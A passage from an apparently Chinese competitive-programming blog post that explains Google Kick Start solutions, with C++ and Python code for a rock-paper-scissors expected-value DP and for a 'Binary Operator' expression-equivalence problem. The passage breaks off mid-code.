<li>假设第<code>t</code>轮己方选择的是布，则第<code>t</code>轮对方选择为石头时己方会赢,而此时对方选择为石头的概率为$\frac{s}{r+p+s-1}$;对方选择的是布时，己方会平局，则此时对方选择为布的概率为$\frac{r}{r+p+s-1}$.因此我们可以推导如下：<br>$$<br>dp[r][p][s] &#x3D; max(dp[r][p][s],dp[r][p-1][s] + W<em>\frac{s}{r+p+s-1} + E</em>\frac{r}{r+p+s-1})<br>$$</li>
</ul>
</li>
<li><ul>
<li>假设第<code>t</code>轮己方选择的是剪刀，则第<code>t</code>轮对方选择为布时己方会赢,而此时对方选择为布的概率为$\frac{r}{r+p+s-1}$;对方选择的是剪刀时，己方会平局，则此时对方选择为剪刀的概率为$\frac{p}{r+p+s-1}$.因此我们可以推导如下：<br>$$<br>dp[r][p][s] &#x3D; max(dp[r][p][s],dp[r][p][s-1] + W<em>\frac{r}{r+p+s-1} + E</em>\frac{p}{r+p+s-1})<br>$$</li>
</ul>
</li>
<li>我们依次遍历所有的可能即可得到在满足$r + p + s &#x3D; 60$时的最大期望值，并记录下最大期望值时，$(r,p,s)$分别是多少。</li>
</ul>
<ol start="3">
<li>最后还有关键的一步，我们如何找到最优的步骤，此时我们可以设定一个数字$choose[r][p][s]$表示当前选择为$(r,p,s)$时，则此时的最后一轮出示的到底是石头、剪刀还是布。我们分别对相应的计数进行减<code>1</code>，寻找前一个最优解的最后一轮出示的内容，则依次我们即可找到最优解，最后进行倒序即可。感觉<code>google</code>给的分析解答貌似表达式有问题，还是自己琢磨最靠谱。</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> days,exp_value;</span><br><span class="line">    <span class="type">int</span> win,equal;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;days&gt;&gt;exp_value;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= days; ++j)&#123;</span><br><span class="line">        string ans;</span><br><span class="line">        cin&gt;&gt;win&gt;&gt;equal;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//r &lt; p &lt; s &lt; r</span></span><br><span class="line">        <span class="type">double</span> dp[<span class="number">61</span>][<span class="number">61</span>][<span class="number">61</span>]; </span><br><span class="line">        <span class="type">char</span> choose[<span class="number">61</span>][<span class="number">61</span>][<span class="number">61</span>];</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">memset</span>(choose,<span class="number">0</span>,<span class="built_in">sizeof</span>(choose));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*intial*/</span></span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="built_in">double</span>(win + equal)/<span class="number">3</span>;</span><br><span class="line">        choose[<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>] = <span class="built_in">double</span>(win + equal)/<span class="number">3</span>;</span><br><span class="line">        choose[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">1</span>] = <span class="built_in">double</span>(win + equal)/<span class="number">3</span>;</span><br><span class="line">        choose[<span class="number">0</span>][<span class="number">0</span>][<span class="number">1</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> x,y,z;</span><br><span class="line">        <span class="type">double</span> maxexpr = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*get maxmium expect value of each day*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">60</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> r = <span class="number">0</span>; r &lt;= i; ++r)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = <span class="number">0</span>; r + p &lt;= i; ++p)&#123;</span><br><span class="line">                    <span class="comment">/*all the possible*/</span></span><br><span class="line">                    <span class="type">int</span> s = i - r - p;</span><br><span class="line">                    <span class="type">double</span> curr = <span class="number">0.0</span>;</span><br><span class="line">                    <span class="comment">// win : (r,s) , euqal (r,r)</span></span><br><span class="line">                    <span class="comment">// we choose &quot;R&quot;, friend choose &quot;S&quot; OR &quot;R&quot;</span></span><br><span class="line">                    <span class="keyword">if</span>(r &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        curr = dp[r<span class="number">-1</span>][p][s] + (<span class="type">double</span>)win*(p)/(i<span class="number">-1</span>) + (<span class="type">double</span>)equal*(s)/(i<span class="number">-1</span>);</span><br><span class="line">                        <span class="keyword">if</span>(curr &gt; dp[r][p][s])&#123;</span><br><span class="line">                            dp[r][p][s] = curr;</span><br><span class="line">                            choose[r][p][s] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// win : (p,r) , euqal (p,p)</span></span><br><span class="line">                    <span class="comment">// we choose &quot;P&quot;, friend choose &quot;R&quot; OR &quot;P&quot;</span></span><br><span class="line">                    <span class="keyword">if</span>(p &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        curr = dp[r][p<span class="number">-1</span>][s] + (<span class="type">double</span>)win*(s)/(i<span class="number">-1</span>) + (<span class="type">double</span>)(equal)*(r)/(i<span class="number">-1</span>);</span><br><span class="line">                        <span class="keyword">if</span>(curr &gt; dp[r][p][s])&#123;</span><br><span class="line">                            dp[r][p][s] = curr;</span><br><span class="line">                            choose[r][p][s] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;     </span><br><span class="line">                    <span class="comment">// win : (s,p) , euqal (s,s)</span></span><br><span class="line">                    <span class="comment">// we choose &quot;S&quot;, friend choose &quot;P&quot; OR &quot;S&quot;</span></span><br><span class="line">                    <span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        curr = dp[r][p][s<span class="number">-1</span>] + (<span class="type">double</span>)win*(r)/(i<span class="number">-1</span>) + (<span class="type">double</span>)(equal)*(p)/(i<span class="number">-1</span>);</span><br><span class="line">                        <span class="keyword">if</span>(curr &gt; dp[r][p][s])&#123;</span><br><span class="line">                            dp[r][p][s] = curr;</span><br><span class="line">                            choose[r][p][s] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i == <span class="number">60</span> &amp;&amp; dp[r][p][s] &gt; maxexpr)&#123;</span><br><span class="line">                        maxexpr = dp[r][p][s];</span><br><span class="line">                        x = r;</span><br><span class="line">                        y = p;</span><br><span class="line">                        z = s;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">60</span>; ++i)&#123;</span><br><span class="line">            <span class="type">char</span> c = choose[x][y][z];</span><br><span class="line">            ans.<span class="built_in">push_back</span>(c);</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;R&#x27;</span>) x--;;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;P&#x27;</span>) y--;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;S&#x27;</span>) z--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>());</span><br><span class="line">        <span class="comment">// we just maxium the expect value of dp[60];</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;j&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">slove</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="d-Binary-Operator"><a href="#d-Binary-Operator" class="headerlink" title="d.Binary Operator"></a>d.Binary Operator</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/05/25/qMp3RSFwnGICbB5.png"></p>
<h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec290">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec290</a></p>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> <code>hash</code></p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>最后一题真心挺难，看了很长时间没有看懂题意,Q4全部做出来且测试用例全部通过的全球不到<code>100</code>人。题目大概的意思是可以对题目中给定的表达式进行化简，然后将化简得表达式进行分类，将表达式相同的进行划分为同一类，最终输出每个表达式的分类。</li>
<li>仔细看一下感觉题目还是非常的复杂，但是最终涉及到需要对表达式进行化简处理，还需要对表达式进行移位和合并计算，刚开始意味非常的麻烦，最后看了大家的解法，各种神奇的解法。</li>
</ol>
<ul>
<li><code>Errichto</code>的解法是用一个非常特殊的<code>hash</code>运算来替代<code>#</code>运算，<code>lucifer1004</code>的解法是把所有可能的运算都计算一遍，如果发现所有可能运算结果都相等，则认为两个表达式相等，否则则认为不相等。确实是暴力出奇迹的解法,如果按照这两种思路来求解表达式的值的话，这题反而没有那么难了，仔细检查了一下答案发现好多人都用这种解法来完成，当然这种解法存在一定的概率导致出现冲突而计算错误，但是实际商概率非常小。</li>
</ul>
<ol start="3">
<li>主要是题目中涉及到这个<code>#</code>的处理，如果完全用表达式的话，则确实不太好处理，反而我们换种思路去测试它的计算结果是否一致来检测两个表达式是否相等。求该表达式求值本身比较简单，利用后缀式即可，利用栈来处理，这个是常规做法。</li>
<li>官方给的解答是将所有的表达式转化为逆波兰式，然后再通过某种调整的方法对二叉树进行调整，最终判定逆波兰式的二叉树是否相等，不过确实好复杂。</li>
</ol>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><ol>
<li>暴力测试所有可能的运算<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdin</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">randoms = [randint(-<span class="number">1000</span>, <span class="number">1000</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_int</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(stdin.readline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_ints</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>(<span class="built_in">int</span>, stdin.readline().split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plus</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y + randoms[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x - y + randoms[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x * y + randoms[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_div</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x // (<span class="built_in">abs</span>(y) + <span class="number">1</span>) + randoms[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_inv_div</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y // (<span class="built_in">abs</span>(x) + <span class="number">1</span>) + randoms[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_mod</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x % (<span class="built_in">abs</span>(y) + <span class="number">1</span>) + randoms[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_inv_mod</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y % (<span class="built_in">abs</span>(x) + <span class="number">1</span>) + randoms[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_and</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x &amp; y + randoms[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_or</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x | y + randoms[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_xor</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x ^ y + randoms[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">const</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> randoms[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">only_x</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + randoms[<span class="number">11</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">only_y</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y + randoms[<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quad_x</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x + y + randoms[<span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quad_y</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y * y + randoms[<span class="number">14</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">funcs = [plus, sub, mul, my_div, my_mod, my_inv_div, my_inv_mod,</span><br><span class="line">         bit_and, bit_or, bit_xor, const, only_x, only_y, quad_x, quad_y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Expression</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, s</span>):</span><br><span class="line">        self.s = <span class="string">&#x27;(&#x27;</span> + s + <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">evaluate</span>(<span class="params">self, func</span>):</span><br><span class="line">        nums = []</span><br><span class="line">        ops = []</span><br><span class="line">        curr = <span class="number">0</span></span><br><span class="line">        is_num = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.s:</span><br><span class="line">            <span class="keyword">if</span> c == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> is_num:</span><br><span class="line">                    nums.append(curr)</span><br><span class="line">                    is_num = <span class="literal">False</span></span><br><span class="line">                ops.append(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> c <span class="keyword">in</span> <span class="string">&#x27;+*#&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> is_num:</span><br><span class="line">                    nums.append(curr)</span><br><span class="line">                    is_num = <span class="literal">False</span></span><br><span class="line">                ops.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> is_num:</span><br><span class="line">                    nums.append(curr)</span><br><span class="line">                    is_num = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">while</span> ops[-<span class="number">1</span>] != <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                    op = ops.pop()</span><br><span class="line">                    b = nums.pop()</span><br><span class="line">                    a = nums.pop()</span><br><span class="line">                    <span class="keyword">if</span> op == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                        nums.append(a + b)</span><br><span class="line">                    <span class="keyword">elif</span> op == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                        nums.append(a * b)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        nums.append(func(a, b))</span><br><span class="line">                ops.pop()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> is_num:</span><br><span class="line">                    curr = <span class="number">0</span></span><br><span class="line">                    is_num = <span class="literal">True</span></span><br><span class="line">                curr = curr * <span class="number">10</span> + <span class="built_in">int</span>(c)</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(nums) == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">            a = self.evaluate(func)</span><br><span class="line">            b = other.evaluate(func)</span><br><span class="line">            <span class="keyword">if</span> a != b:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = read_int()</span><br><span class="line"><span class="keyword">for</span> case_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t + <span class="number">1</span>):</span><br><span class="line">    n = read_int()</span><br><span class="line">    expressions = [Expression(<span class="built_in">input</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">    color = [<span class="number">0</span>] * n</span><br><span class="line">    color[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    new_color = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            <span class="keyword">if</span> expressions[i] == expressions[j]:</span><br><span class="line">                color[i] = color[j]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> color[i] == <span class="number">0</span>:</span><br><span class="line">            color[i] = new_color</span><br><span class="line">            new_color += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Case #<span class="subst">&#123;case_num&#125;</span>: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, color))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>利用特殊的<code>hash</code>替代<code>#</code><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sim template &lt; class c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ris return * this</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dor &gt; debug &amp; operator &lt;&lt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> eni(x) sim &gt; typename \</span></span><br><span class="line"><span class="meta">  enable_if<span class="string">&lt;sizeof dud&lt;c&gt;</span>(0) x 1, debug&amp;&gt;::type operator&lt;&lt;(c i) &#123;</span></span><br><span class="line">sim &gt; <span class="keyword">struct</span> <span class="title class_">rge</span> &#123; c b, e; &#125;;</span><br><span class="line">sim &gt; <span class="function">rge&lt;c&gt; <span class="title">range</span><span class="params">(c i, c j)</span> </span>&#123; <span class="keyword">return</span> rge&lt;c&gt;&#123;i, j&#125;; &#125;</span><br><span class="line">sim &gt; <span class="function"><span class="keyword">auto</span> <span class="title">dud</span><span class="params">(c* x)</span> -&gt; <span class="title">decltype</span><span class="params">(cerr &lt;&lt; *x, <span class="number">0</span>)</span></span>;</span><br><span class="line">sim &gt; <span class="function"><span class="type">char</span> <span class="title">dud</span><span class="params">(...)</span></span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">debug</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LOCAL</span></span><br><span class="line">~<span class="built_in">debug</span>() &#123; cerr &lt;&lt; endl; &#125;</span><br><span class="line"><span class="built_in">eni</span>(!=) cerr &lt;&lt; boolalpha &lt;&lt; i; ris; &#125;</span><br><span class="line"><span class="built_in">eni</span>(==) ris &lt;&lt; <span class="built_in">range</span>(<span class="built_in">begin</span>(i), <span class="built_in">end</span>(i)); &#125;</span><br><span class="line">sim, <span class="function"><span class="keyword">class</span> b <span class="title">dor</span><span class="params">(pair &lt; b, c &gt; d)</span> </span>&#123;</span><br><span class="line">  ris &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; d.first &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; d.second &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">sim <span class="title">dor</span><span class="params">(rge&lt;c&gt; d)</span> </span>&#123;</span><br><span class="line">  *<span class="keyword">this</span> &lt;&lt; <span class="string">&quot;[&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = d.b; it != d.e; ++it)</span><br><span class="line">	*<span class="keyword">this</span> &lt;&lt; <span class="string">&quot;, &quot;</span> + <span class="number">2</span> * (it == d.b) &lt;&lt; *it;</span><br><span class="line">  ris &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function">sim <span class="title">dor</span><span class="params">(<span class="type">const</span> c&amp;)</span> </span>&#123; ris; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> imie(...) <span class="string">&quot; [&quot;</span> &lt;&lt; #__VA_ARGS__ <span class="string">&quot;: &quot;</span> &lt;&lt; (__VA_ARGS__) &lt;&lt; <span class="string">&quot;] &quot;</span></span></span><br><span class="line"><span class="comment">// debug &amp; operator &lt;&lt; (debug &amp; dd, P p) &#123; dd &lt;&lt; &quot;(&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot;; return dd; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">1000050131</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">10005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hasz</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="number">100594677LL</span> * (a + <span class="number">450617412</span>)) ^ <span class="number">208774486</span>) % mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">char</span> ope)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ope == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> (a + b) % mod;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(ope == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span>) a * b % mod;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">assert</span>(ope == <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> (((<span class="number">337807718LL</span> * <span class="built_in">hasz</span>(a)) + <span class="number">254452523</span>) ^ ((<span class="number">842188890LL</span> * <span class="built_in">hasz</span>(b)) + <span class="number">900099649</span>)) % mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_balance</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rec</span><span class="params">(<span class="type">int</span> L, <span class="type">int</span> R)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// debug() &lt;&lt; imie(L) imie(R);</span></span><br><span class="line">	<span class="type">int</span> bal = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = L; i &lt;= R; ++i) &#123;</span><br><span class="line">		bal += <span class="built_in">get_balance</span>(s[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">assert</span>(bal == <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(s[L] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">		<span class="type">int</span> balance = <span class="number">1</span>;</span><br><span class="line">		<span class="type">int</span> i = L + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(balance &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			balance += <span class="built_in">get_balance</span>(s[i]);</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// past closing bracket</span></span><br><span class="line">		<span class="type">int</span> a = <span class="built_in">rec</span>(L + <span class="number">1</span>, i - <span class="number">2</span>); <span class="comment">// this was inside the brackets</span></span><br><span class="line">		<span class="keyword">if</span>(i &gt;= R) &#123;</span><br><span class="line">			<span class="keyword">return</span> a;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">assert</span>(s[i] == <span class="string">&#x27;#&#x27;</span> || s[i] == <span class="string">&#x27;+&#x27;</span> || s[i] == <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">		<span class="comment">// debug() &lt;&lt; imie(i+1) imie(R);</span></span><br><span class="line">		<span class="type">int</span> b = <span class="built_in">rec</span>(i + <span class="number">1</span>, R);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">merge</span>(a, b, s[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(L &lt;= R &amp;&amp; <span class="built_in">isdigit</span>(s[L])) &#123;</span><br><span class="line">		a = (<span class="number">10LL</span> * a + (s[L] - <span class="string">&#x27;0&#x27;</span>)) % mod;</span><br><span class="line">		L++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span 